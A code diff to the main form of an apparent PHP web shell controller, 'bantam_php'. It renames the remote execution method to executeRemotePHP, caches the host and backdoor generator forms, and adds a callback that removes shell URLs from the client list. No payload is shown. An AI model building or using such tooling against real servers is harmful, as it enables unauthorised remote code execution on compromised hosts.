@@ -26,7 +26,14 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public Dictionary<String, HostInfo> Hosts = new Dictionary<String, HostInfo>();
+        public static Dictionary<String, HostInfo> Hosts = new Dictionary<String, HostInfo>();
+
+
+        /// <summary>
+        /// Static Forms
+        /// </summary>
+        public AddHost addClientForm;
+        public BackdoorGenerator backdoorGenerator;
 
         /// <summary>
         /// Main Form Constructor, performs the initialization routine, and requests some basic information about every server provided
@@ -208,6 +215,22 @@ namespace bantam_php
 
             lvi.SubItems[1].Text = Hosts[hostTarget].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
             Hosts[hostTarget].PingStopwatch.Stop();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="shellURL"></param>
+        public delegate void guiCallbackRemoveShellURLDeledate(string shellURL);
+        public void guiCallbackRemoveShellURL(string shellURL)
+        {
+            if (this.InvokeRequired)
+            {
+                this.Invoke(new guiCallbackRemoveShellURLDeledate(guiCallbackRemoveShellURL), shellURL);
+                return;
+            }
+
+            listViewClients.FindItemWithText(shellURL).Remove();
         }
 
         /// <summary>
@@ -570,7 +593,7 @@ namespace bantam_php
         }
 
 
-        public string executePHPWrapper(string hostTarget, string phpCode)
+        public string executeRemotePHP(string hostTarget, string phpCode)
         {
             if (validTarget(hostTarget) == false)
             {
@@ -590,7 +613,7 @@ namespace bantam_php
         /// <param name="title"></param>
         public void richTextboxDialogThread(string hostTarget, string phpCode, string title)
         {
-            string resultTxt = executePHPWrapper(hostTarget, phpCode);
+            string resultTxt = executeRemotePHP(hostTarget, phpCode);
 
             if (string.IsNullOrEmpty(resultTxt) == false)
             {
@@ -613,7 +636,7 @@ namespace bantam_php
                 Stopwatch pingWatch = new Stopwatch();
                 pingWatch.Start();
 
-                string result = executePHPWrapper(hostTarget, PhpHelper.initDataVars);
+                string result = executeRemotePHP(hostTarget, PhpHelper.initDataVars);
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
@@ -651,7 +674,7 @@ namespace bantam_php
                 DynamicThreadArgs wrapperArgs = (DynamicThreadArgs)args;
 
                 //execute our request in our threads that runs asynchronously along side the GUI thread
-                string result = executePHPWrapper(wrapperArgs.host, wrapperArgs.code);
+                string result = executeRemotePHP(wrapperArgs.host, wrapperArgs.code);
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
@@ -729,24 +752,6 @@ namespace bantam_php
                 startPhpExecutionThread(PhpHelper.phpTestExecutionWithEcho, guiCallbackUpdateListViewItemPing, callbackArgs);
             }
         }
-
-        //TODO low priority make the redtube a editable link
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void unameaToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            if (validTarget() == false)
-            {
-                return;
-            }
-
-            //todo wtf is going on here with the browser view method, unametoolstrip click.. and no callback..
-            startPhpExecutionThread(PhpHelper.getBasicCurl("http://youtube.com/"), guiCallbackBrowserViewMethod);
-        }
-
 
         /// <summary>
         /// 
@@ -1424,7 +1429,10 @@ namespace bantam_php
 
         private void addToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            AddHost addClientForm = new AddHost();
+            if (addClientForm == null)
+            {
+                addClientForm = new AddHost();
+            }
             addClientForm.Show();
         }
 
@@ -1513,7 +1521,10 @@ namespace bantam_php
 
         private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
+            if (backdoorGenerator == null)
+            {
+                backdoorGenerator = new BackdoorGenerator();
+            }
             backdoorGenerator.Show();
         }
 
